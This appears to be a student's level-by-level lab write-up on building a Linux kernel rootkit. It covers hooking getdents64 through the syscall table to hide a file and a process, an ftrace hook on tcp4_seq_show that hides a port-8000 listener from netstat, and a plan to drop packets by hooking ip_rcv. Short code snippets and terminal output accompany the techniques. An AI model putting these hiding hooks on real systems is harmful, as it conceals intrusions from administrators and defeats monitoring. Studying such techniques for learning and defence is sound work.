# level 1

**disclaimer:** 

my rootkit skeleton was taken from this blog:

https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234

## A
printing from a kernel module is done using the function printk.
It accept a log level and a format string, and the output can be seen with the dmesg(1) command

## B
compiling an LKM is done using a makefile:
``` makefile
obj-m += rootkit.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```

## C
- listing currently loaded LKMs is done with the command lsmod(8)
- inserting a module is done with insmod(8)
- removing a loaded module is done with rmmod(8)

# level 2

the file I am choosing to hide is /etc/hideme.

my goal here will be to hook and change the relevant syscall output before it reaches ls.

by using strace I figured that the syscall ls(1) is using for listing files is statx(2).

our goal here is probably to hook the call to statx, and strip it of the entry we want to hide. 

after some expirimentation with it, it seems I misunderstood the situation.

the order of the syscalls is

1. statx- get stats of file.

2. openat- open directory and get fd

3. getdents64- actually get the contents of the directory.
   it returns the wanted data as a struct, which can be parsed, + the size of the data in bytes.

   so that is the 2 things we have to change.


## hooking

I chose to hook functions by getting the address of the syscall table and replacing pointers to functions there with my custom functions.

I used [this](https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c) article to find out how to get the address of the syscall table from inside the kernel module:

```c
printk("The address of sys_call_table is: %lx\n", kallsyms_lookup_name("sys_call_table"));
```

### oops

compilation error: 

ERROR: modpost: "kallsyms_lookup_name" [/home/royco/rootkit/rootkit.ko] undefined!

it seems the method is outdated and the function is not exported in latest kernels :(

I figured out how to give command line arguments to kernel modules with module_param,
and from [this project](https://github.com/DanielNiv/Process-Hiding-Rootkit/blob/master/captainHook.c) I got the idea of getting the address of kallsyms_lookup_name function from /proc/kallsyms and setting it in the code.



I managed to hook the function getdents, and my function is now called instead while the lkm is loaded.

from reading online I saw that when syscalled are called from userspace, the arguments are stored in %rdi,%rsi,%rdx,%r10,%r8,%r9 respectively.
getdents signature looks like this:


   ```c
   size_t getdents64(int fd, void *dirp, size_t count);
   ```

which means that the dirent structure which I want to change will be in the RSI register.

### crashing

i've run into a situation where the following line caused a system crash:

```c
printk("%d\n",dirent->d_reclen); - this line crashes the kernel
```

where dirent is a userspace address containing the dirent64 struct.

I saw that [this blogpost](https://xcellerator.github.io/posts/linux_rootkits_06/) allocated a kernel buffer and copied the struct to there, then operated on it there. I tried it and it stopped crashing. 
I'm still not sure why dereferencing a userspace addr from kernel caused the crash- **need to learn more about it.**

turns out it also crashes when doing printk on the kernel-buffer copied struct, but it works fine otherwise- just the printk crashes it. No idea why this happens but it wasted me some precious time.

**disclaimer:**  most of the hooked getdents64 is based on [this article](https://xcellerator.github.io/posts/linux_rootkits_06/), but I tried to understand every line that I copied.

**aother disclaimer:** there are still parts I don't understand properly here, most of which are 

- kallsyms
- make_address_rw/ro 

still working on it.





# level 3

from strace'ing netstat, it seems that the data comes from reading and parsing /proc/net/tcp file.

```
cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 251662 1 0000000000000000 100 0 0 10 0                    
   1: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 40139 1 0000000000000000 100 0 0 10 0                     
   2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 36619 1 0000000000000000 100 0 0 10 5                     
   3: 803AA8C0:D062 95F1BDCE:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 186237 1 0000000000000000 20 4 28 10 -1                   
   4: 803AA8C0:C0E6 B3AF2734:01BB 01 00000000:00000000 02:000051DD 00000000  1000        0 69620 2 0000000000000000 20 4 28 10 -1                    
   5: 803AA8C0:DE52 1121E32C:01BB 08 00000000:0000004E 02:00001147 00000000  1000        0 88197 2 0000000000000000 68 4 0 10 -1                     
   6: 803AA8C0:8EFE EFED7522:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 257294 1 0000000000000000 22 4 30 10 -1

```

this^ is while having a python httpserver on port 8000.

```
openat(AT_FDCWD, "/proc/net/tcp", O_RDONLY) = 3
read(3, "  sl  local_address rem_address "..., 4096) = 1050

```

I can think of an option of how to solve this from here with syscall hooking:

hook the read syscall, and check if the opened file is /proc/net/tcp. if it is, remove the server line from the output.

- this will be complicated because if we hook the read function we only have an fd, not filename, and we will have to backtrack what the filename is.
- checking all the read outputs without checking if its relevant to us might have performance issues since read is a very common syscall in linux



both of the above options seem complicated to implement.

[this blog](https://xcellerator.github.io/posts/linux_rootkits_08/) reminded me that /proc is a virtual FS and not a real one, which means every read from it is actually outputted from a function in the kernel.

```bash
cat /proc/net/tcp
sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode ....
										.....snipped.....
```

I saw this print format, and decided to grep it in the linux kernel sources.

```bash
 grep rem_address -irnI .
 /net/ipv4/tcp_ipv4.c:2655:             seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
./net/ipv4/ping.c:1146:         seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
./net/ipv4/raw.c:1073:          seq_printf(seq, "  sl  local_address rem_address   st tx_queue "
./net/ipv4/udp.c:3094:          seq_puts(seq, "   sl  local_address rem_address   st tx_queue "

```

seems like the relevant one is /net/ipv4/tcp_ipv4.c

```c
static int tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct tcp_iter_state *st;
	struct sock *sk = v;

	seq_setwidth(seq, TMPSZ - 1);
	if (v == SEQ_START_TOKEN) {
		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
			   "rx_queue tr tm->when retrnsmt   uid  timeout "
			   "inode");
		goto out;
	}
	st = seq->private;

	if (sk->sk_state == TCP_TIME_WAIT)
		get_timewait4_sock(v, seq, st->num);
	else if (sk->sk_state == TCP_NEW_SYN_RECV)
		get_openreq4(v, seq, st->num);
	else
		get_tcp4_sock(v, seq, st->num);
out:
	seq_pad(seq, '\n');
	return 0;
}
```

seems like this function is called for every line of output. if I hook it and make sure it doesn't print out the line with my chosen port, then I can effectively hide it.

```c
static void get_tcp4_sock(struct sock *sk, struct seq_file *f, int i)
{
	int timer_active;
	unsigned long timer_expires;
	const struct tcp_sock *tp = tcp_sk(sk);
	const struct inet_connection_sock *icsk = inet_csk(sk);
	const struct inet_sock *inet = inet_sk(sk);
	const struct fastopen_queue *fastopenq = &icsk->icsk_accept_queue.fastopenq;
	__be32 dest = inet->inet_daddr;
	__be32 src = inet->inet_rcv_saddr;
	__u16 destp = ntohs(inet->inet_dport);
	__u16 srcp = ntohs(inet->inet_sport);
	int rx_queue;
	int state;

	if (icsk->icsk_pending == ICSK_TIME_RETRANS ||
	    icsk->icsk_pending == ICSK_TIME_REO_TIMEOUT ||
	    icsk->icsk_pending == ICSK_TIME_LOSS_PROBE) {
		timer_active	= 1;
		timer_expires	= icsk->icsk_timeout;
	} else if (icsk->icsk_pending == ICSK_TIME_PROBE0) {
		timer_active	= 4;
		timer_expires	= icsk->icsk_timeout;
	} else if (timer_pending(&sk->sk_timer)) {
		timer_active	= 2;
		timer_expires	= sk->sk_timer.expires;
	} else {
		timer_active	= 0;
		timer_expires = jiffies;
	}

	state = inet_sk_state_load(sk);
	if (state == TCP_LISTEN)
		rx_queue = READ_ONCE(sk->sk_ack_backlog);
	else
		/* Because we don't lock the socket,
		 * we might find a transient negative value.
		 */
		rx_queue = max_t(int, READ_ONCE(tp->rcv_nxt) -
				      READ_ONCE(tp->copied_seq), 0);

	seq_printf(f, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX "
			"%08X %5u %8d %lu %d %pK %lu %lu %u %u %d",
		i, src, srcp, dest, destp, state,
		READ_ONCE(tp->write_seq) - tp->snd_una,
		rx_queue,
		timer_active,
		jiffies_delta_to_clock_t(timer_expires - jiffies),
		icsk->icsk_retransmits,
		from_kuid_munged(seq_user_ns(f), sock_i_uid(sk)),
		icsk->icsk_probes_out,
		sock_i_ino(sk),
		refcount_read(&sk->sk_refcnt), sk,
		jiffies_to_clock_t(icsk->icsk_rto),
		jiffies_to_clock_t(icsk->icsk_ack.ato),
		(icsk->icsk_ack.quick << 1) | inet_csk_in_pingpong_mode(sk),
		tcp_snd_cwnd(tp),
		state == TCP_LISTEN ?
		    fastopenq->max_qlen :
		    (tcp_in_initial_slowstart(tp) ? -1 : tp->snd_ssthresh));
}
```

from here ^ I can see that it is going to be pretty easy, we just need to create an inet_sock from the socket buffer like here:

```c
	const struct inet_sock *inet = inet_sk(sk);
	if(srcp ==  my_rootkit_port){
        //do_bad_stuff
    }
```

and hook this logic before tcp4_seq_show output is called.



I will be using ftrace to hook the function. 
I wanted to use the helper module [this dude wrote](https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h), but it didn't go so well, because in my kernel the C api changed- mostly names of structs and enums- this was easy enough to fix, but also because he relies on kallsyms_lookup_name function being exported, which it isn't in my kernel, so I need to solve it.

This is mostly a technical issue since I already dealt with it in my lkm code, but I need to give it to the helper as well.

Perhaps I need to put it in a seperate header file and include it in both the module and the helper.

did it and now it works.



currently stuck in a situation where the process of hooking with ftrace somehow crashes the kernel, and i'm unable to debug it properly.

I should properly step up my debug game- printk is not enough and doesn't help at all in the case of crashes.





I've decided its better to write every step of the rootkit in a seperate module, for better debugging.

when I seperated it into 2 files it suddenly worked- no idea what happened here, but it seems I entered a rabbit hole of debugging it.

since all that these functions do is print stuff, I feel comfortable messsing them up and making them not print the line with my server. every call to the function is returning one line, and it returns 0 if it succeeds, so no harm in returning early and printing an empty line if it contains our intended source port.

```c
inet = inet_sk(sk);
	srcp = ntohs(inet->inet_sport);
	if (srcp == 8000){
		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
		seq_puts(seq, "");
		return 0;
	}
	return old_tcp4_seq_show(seq, v);
```

now netstat -ant doesn't show my server.



and thats level 3 done.





# level 4

now we need to hide a process from ps command.
ps gets its information from /proc filesystem.

it iterates over it and gets the relevant information and displays it nicely.

so here, I can, like in level 2, use the call to getdents64 to catch ps trying to list the contents of /proc, and filter by pid.



```
openat(AT_FDCWD, "/proc", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 5
getdents64(5, 0x55dd42415060 /* 387 entries */, 32768) = 9784
```



but this solution is not very good- getdents64 gets an open fd and uses it, it is not aware of what is the name of the directory it lists. this means that if we filter getdents64 entries by "pid", we might have wierd side-effects of users listing things with the same name as that pid and it will be hidden- not very common but possible.

so I will try to find a more subtle solution, and if it doesn't work I will come back to this.

actually, my current solution for hiding from ls works out of the box for hiding procceses with this method too:

```bash
_  ls_rootkit git:(main) _ ps aux | grep python

root         800  0.0  0.5  49668 21448 ?        Ss   Jun05   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         948  0.0  0.6 126692 23360 ?        Ssl  Jun05   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
royco      16334  0.6  0.4  38716 17256 pts/3    S+   01:11   0:00 python3 -m http.server
royco      16336  0.0  0.0  17864  2372 pts/2    S+   01:11   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python



_  ls_rootkit git:(main) _ sudo ./insert_rootkit.sh 16334 

_  ls_rootkit git:(main) _ ps aux | grep python          
root         800  0.0  0.5  49668 21448 ?        Ss   Jun05   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         948  0.0  0.6 126692 23360 ?        Ssl  Jun05   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
royco      16374  0.0  0.0  17864  2304 pts/2    S+   01:11   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python

```



# blocking traffic by filter

now I need to block traffic by a certain filter. this seems like a big goal so I don't even know where to start. if I want to block by IP then I can sit on the IP stack and block anything- arp, ping, tcp udp etc. and if I sit higher- tcp for example- I can filter by port but cannot filter non-tcp protocols.

seems like IP is a better choice for now.

```c
int ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
	   struct net_device *orig_dev)
{
	struct net *net = dev_net(dev);

	skb = ip_rcv_core(skb, net);
	if (skb == NULL)
		return NET_RX_DROP;

	return NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,
		       net, NULL, skb, dev, NULL,
		       ip_rcv_finish);
}
```

from some poking around, this might be relevant.

https://elixir.bootlin.com/linux/latest/source/net/ipv4/ip_input.c#L547	

I used [this article](https://blog.packagecloud.io/monitoring-tuning-linux-networking-stack-receiving-data/) as reference.

it seems pretty straight forward what I need to do here:

​	return NET_RX_DROP; - this line probably drops the packet.

1. hook this function
2. parse the sk_buff struct
3.  extract the source IP
4. if it is our target bad IP, drop with NET_RX_DROP.
5. else, return.
